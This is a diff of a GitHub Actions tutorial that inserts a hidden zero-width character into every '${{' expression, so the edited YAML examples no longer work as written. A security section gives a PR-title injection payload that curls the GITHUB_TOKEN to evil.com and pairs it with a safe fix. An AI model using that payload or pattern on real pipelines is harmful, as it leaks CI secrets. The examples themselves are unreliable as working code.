@@ -98,7 +98,7 @@ Workflow (.yml file)
 
 ### Expression Syntax and Context Objects
 
-GitHub Actions uses a powerful expression language accessible via `${{ ... }}` syntax (note: in the actual YAML files). The context objects available are:
+GitHub Actions uses a powerful expression language accessible via `${​{ ... }}` syntax (note: in the actual YAML files). The context objects available are:
 
 | Context | Contents | Example |
 |---------|----------|---------|
@@ -196,7 +196,7 @@ Matrix strategies allow running the same job across multiple configurations:
 ```yaml
 jobs:
   test:
-    runs-on: ${{ matrix.os }}
+    runs-on: ${​{ matrix.os }}
     strategy:
       fail-fast: false
       max-parallel: 6
@@ -216,7 +216,7 @@ jobs:
       - uses: actions/checkout@v4
       - uses: actions/setup-node@v4
         with:
-          node-version: ${{ matrix.node-version }}
+          node-version: ${​{ matrix.node-version }}
       - run: npm ci
       - run: npm test
       - if: matrix.coverage
@@ -240,7 +240,7 @@ jobs:
   generate-matrix:
     runs-on: ubuntu-latest
     outputs:
-      matrix: ${{ steps.set-matrix.outputs.matrix }}
+      matrix: ${​{ steps.set-matrix.outputs.matrix }}
     steps:
       - uses: actions/checkout@v4
       - id: set-matrix
@@ -256,10 +256,10 @@ jobs:
     if: needs.generate-matrix.outputs.matrix != '{"package":[]}'
     runs-on: ubuntu-latest
     strategy:
-      matrix: ${{ fromJson(needs.generate-matrix.outputs.matrix) }}
+      matrix: ${​{ fromJson(needs.generate-matrix.outputs.matrix) }}
     steps:
       - uses: actions/checkout@v4
-      - run: npm test --workspace=packages/${{ matrix.package }}
+      - run: npm test --workspace=packages/${​{ matrix.package }}
 ```
 
 ### Caching Deep Dive
@@ -274,9 +274,9 @@ Caching is critical for performance. GitHub Actions provides two mechanisms: `ac
     path: |
       ~/.npm
       node_modules
-    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
+    key: npm-${​{ runner.os }}-${​{ hashFiles('**/package-lock.json') }}
     restore-keys: |
-      npm-${{ runner.os }}-
+      npm-${​{ runner.os }}-
 
 # Check if cache was hit
 - if: steps.npm-cache.outputs.cache-hit != 'true'
@@ -357,7 +357,7 @@ jobs:
         with:
           role-to-assume: arn:aws:iam::123456789012:role/github-actions
           aws-region: us-east-1
-          role-session-name: github-actions-${{ github.run_id }}
+          role-session-name: github-actions-${​{ github.run_id }}
 
       - run: aws sts get-caller-identity  # Verify credentials work
       - run: aws s3 cp dist/ s3://my-bucket/ --recursive
@@ -419,37 +419,37 @@ on:
     outputs:
       deploy-url:
         description: 'The deployment URL'
-        value: ${{ jobs.deploy.outputs.url }}
+        value: ${​{ jobs.deploy.outputs.url }}
 
 jobs:
   deploy:
     runs-on: ubuntu-latest
-    environment: ${{ inputs.environment }}
+    environment: ${​{ inputs.environment }}
     outputs:
-      url: ${{ steps.deploy.outputs.url }}
+      url: ${​{ steps.deploy.outputs.url }}
     steps:
       - uses: actions/checkout@v4
 
       - name: Configure kubectl
         run: |
-          echo "${{ secrets.KUBECONFIG }}" > /tmp/kubeconfig
+          echo "${​{ secrets.KUBECONFIG }}" > /tmp/kubeconfig
           echo "KUBECONFIG=/tmp/kubeconfig" >> "$GITHUB_ENV"
 
       - name: Deploy
         id: deploy
         run: |
           kubectl set image deployment/app \
-            app=${{ inputs.image-tag }} \
-            --namespace=${{ inputs.environment }}
+            app=${​{ inputs.image-tag }} \
+            --namespace=${​{ inputs.environment }}
           kubectl rollout status deployment/app \
-            --namespace=${{ inputs.environment }} \
+            --namespace=${​{ inputs.environment }} \
             --timeout=300s
-          URL=$(kubectl get ingress -n ${{ inputs.environment }} -o jsonpath='{.items[0].spec.rules[0].host}')
+          URL=$(kubectl get ingress -n ${​{ inputs.environment }} -o jsonpath='{.items[0].spec.rules[0].host}')
           echo "url=https://${URL}" >> "$GITHUB_OUTPUT"
 
       - name: Smoke test
         run: |
-          curl --fail --retry 5 --retry-delay 10 ${{ steps.deploy.outputs.url }}/health
+          curl --fail --retry 5 --retry-delay 10 ${​{ steps.deploy.outputs.url }}/health
 ```
 
 **Calling the reusable workflow**:
@@ -466,29 +466,29 @@ jobs:
   build:
     runs-on: ubuntu-latest
     outputs:
-      image-tag: ${{ steps.build.outputs.tag }}
+      image-tag: ${​{ steps.build.outputs.tag }}
     steps:
       - uses: actions/checkout@v4
       - id: build
-        run: echo "tag=ghcr.io/my-org/app:${{ github.sha }}" >> "$GITHUB_OUTPUT"
+        run: echo "tag=ghcr.io/my-org/app:${​{ github.sha }}" >> "$GITHUB_OUTPUT"
 
   deploy-staging:
     needs: build
     uses: my-org/shared-workflows/.github/workflows/reusable-deploy.yml@v2
     with:
       environment: staging
-      image-tag: ${{ needs.build.outputs.image-tag }}
+      image-tag: ${​{ needs.build.outputs.image-tag }}
     secrets:
-      KUBECONFIG: ${{ secrets.STAGING_KUBECONFIG }}
+      KUBECONFIG: ${​{ secrets.STAGING_KUBECONFIG }}
 
   deploy-production:
     needs: [build, deploy-staging]
     uses: my-org/shared-workflows/.github/workflows/reusable-deploy.yml@v2
     with:
       environment: production
-      image-tag: ${{ needs.build.outputs.image-tag }}
+      image-tag: ${​{ needs.build.outputs.image-tag }}
     secrets:
-      KUBECONFIG: ${{ secrets.PRODUCTION_KUBECONFIG }}
+      KUBECONFIG: ${​{ secrets.PRODUCTION_KUBECONFIG }}
 ```
 
 ### Composite Actions
@@ -513,14 +513,14 @@ inputs:
 outputs:
   cache-hit:
     description: 'Whether dependencies were cached'
-    value: ${{ steps.cache.outputs.cache-hit }}
+    value: ${​{ steps.cache.outputs.cache-hit }}
 
 runs:
   using: 'composite'
   steps:
     - uses: actions/setup-node@v4
       with:
-        node-version: ${{ inputs.node-version }}
+        node-version: ${​{ inputs.node-version }}
 
     - name: Get npm cache directory
       id: npm-cache-dir
@@ -531,10 +531,10 @@ runs:
       id: cache
       with:
         path: |
-          ${{ steps.npm-cache-dir.outputs.dir }}
+          ${​{ steps.npm-cache-dir.outputs.dir }}
           node_modules
-        key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
-        restore-keys: npm-${{ runner.os }}-
+        key: npm-${​{ runner.os }}-${​{ hashFiles('**/package-lock.json') }}
+        restore-keys: npm-${​{ runner.os }}-
 
     - name: Install dependencies
       if: steps.cache.outputs.cache-hit != 'true'
@@ -562,9 +562,9 @@ jobs:
   detect-changes:
     runs-on: ubuntu-latest
     outputs:
-      api: ${{ steps.changes.outputs.api }}
-      web: ${{ steps.changes.outputs.web }}
-      shared: ${{ steps.changes.outputs.shared }}
+      api: ${​{ steps.changes.outputs.api }}
+      web: ${​{ steps.changes.outputs.web }}
+      shared: ${​{ steps.changes.outputs.shared }}
     steps:
       - uses: actions/checkout@v4
       - uses: dorny/paths-filter@v3
@@ -679,7 +679,7 @@ jobs:
       - name: Bump version
         id: bump
         run: |
-          NEW_VERSION=$(npm version ${{ steps.version.outputs.bump }} --no-git-tag-version)
+          NEW_VERSION=$(npm version ${​{ steps.version.outputs.bump }} --no-git-tag-version)
           echo "version=${NEW_VERSION}" >> "$GITHUB_OUTPUT"
 
       - name: Build
@@ -688,7 +688,7 @@ jobs:
       - name: Generate changelog
         id: changelog
         run: |
-          LAST_TAG=${{ steps.version.outputs.last-tag }}
+          LAST_TAG=${​{ steps.version.outputs.last-tag }}
           {
             echo "changelog<<EOF"
             git log ${LAST_TAG}..HEAD --pretty=format:"- %s (%h)" | head -50
@@ -699,17 +699,17 @@ jobs:
       - name: Create release
         uses: softprops/action-gh-release@v2
         with:
-          tag_name: ${{ steps.bump.outputs.version }}
-          name: Release ${{ steps.bump.outputs.version }}
+          tag_name: ${​{ steps.bump.outputs.version }}
+          name: Release ${​{ steps.bump.outputs.version }}
           body: |
             ## Changes
-            ${{ steps.changelog.outputs.changelog }}
+            ${​{ steps.changelog.outputs.changelog }}
           generate_release_notes: true
 
       - name: Publish to registry
         run: npm publish
         env:
-          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          NODE_AUTH_TOKEN: ${​{ secrets.GITHUB_TOKEN }}
 ```
 
 ## Edge Cases & Failure Modes
@@ -737,7 +737,7 @@ This is a real vulnerability class that has affected thousands of repositories.
 # DANGEROUS: PR title is attacker-controlled
 - name: Greet
   run: |
-    echo "PR title: ${{ github.event.pull_request.title }}"
+    echo "PR title: ${​{ github.event.pull_request.title }}"
 ```
 
 An attacker creates a PR with title: `"; curl http://evil.com/steal?token=$GITHUB_TOKEN #`
@@ -747,7 +747,7 @@ An attacker creates a PR with title: `"; curl http://evil.com/steal?token=$GITHU
 # SAFE: Use environment variable (shell-quoted)
 - name: Greet
   env:
-    PR_TITLE: ${{ github.event.pull_request.title }}
+    PR_TITLE: ${​{ github.event.pull_request.title }}
   run: |
     echo "PR title: ${PR_TITLE}"
 ```
@@ -779,9 +779,9 @@ jobs:
       - name: Notify on failure
         if: failure()
         run: |
-          curl -X POST "${{ secrets.SLACK_WEBHOOK }}" \
+          curl -X POST "${​{ secrets.SLACK_WEBHOOK }}" \
             -H 'Content-type: application/json' \
-            -d "{\"text\":\"Pipeline failed: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"}"
+            -d "{\"text\":\"Pipeline failed: ${​{ github.server_url }}/${​{ github.repository }}/actions/runs/${​{ github.run_id }}\"}"
 ```
 
 ## Performance Characteristics
@@ -1042,7 +1042,7 @@ jobs:
       - name: Report trace
         if: always()
         env:
-          OTEL_ENDPOINT: ${{ secrets.OTEL_ENDPOINT }}
+          OTEL_ENDPOINT: ${​{ secrets.OTEL_ENDPOINT }}
         run: |
           END_TIME=$(date +%s%N)
           curl -X POST "${OTEL_ENDPOINT}/v1/traces" \
@@ -1052,18 +1052,18 @@ jobs:
                 \"resource\": {
                   \"attributes\": [
                     {\"key\": \"service.name\", \"value\": {\"stringValue\": \"ci-pipeline\"}},
-                    {\"key\": \"github.repository\", \"value\": {\"stringValue\": \"${{ github.repository }}\"}},
-                    {\"key\": \"github.run_id\", \"value\": {\"stringValue\": \"${{ github.run_id }}\"}}
+                    {\"key\": \"github.repository\", \"value\": {\"stringValue\": \"${​{ github.repository }}\"}},
+                    {\"key\": \"github.run_id\", \"value\": {\"stringValue\": \"${​{ github.run_id }}\"}}
                   ]
                 },
                 \"scopeSpans\": [{
                   \"spans\": [{
-                    \"traceId\": \"${{ steps.trace.outputs.trace-id }}\",
-                    \"spanId\": \"${{ steps.trace.outputs.span-id }}\",
+                    \"traceId\": \"${​{ steps.trace.outputs.trace-id }}\",
+                    \"spanId\": \"${​{ steps.trace.outputs.span-id }}\",
                     \"name\": \"ci-build\",
-                    \"startTimeUnixNano\": \"${{ steps.trace.outputs.start-time }}\",
+                    \"startTimeUnixNano\": \"${​{ steps.trace.outputs.start-time }}\",
                     \"endTimeUnixNano\": \"${END_TIME}\",
-                    \"status\": {\"code\": \"${{ job.status == 'success' && '1' || '2' }}\"}
+                    \"status\": {\"code\": \"${​{ job.status == 'success' && '1' || '2' }}\"}
                   }]
                 }]
               }]
@@ -1135,7 +1135,7 @@ jobs:
       # Generate SLSA provenance
       - uses: slsa-framework/slsa-github-generator/.github/workflows/builder_nodejs_slsa3.yml@v2.0.0
         with:
-          verified-token: ${{ secrets.SLSA_TOKEN }}
+          verified-token: ${​{ secrets.SLSA_TOKEN }}
 ```
 
 This ensures that the action code has not been tampered with between when it was published and when your workflow consumes it.
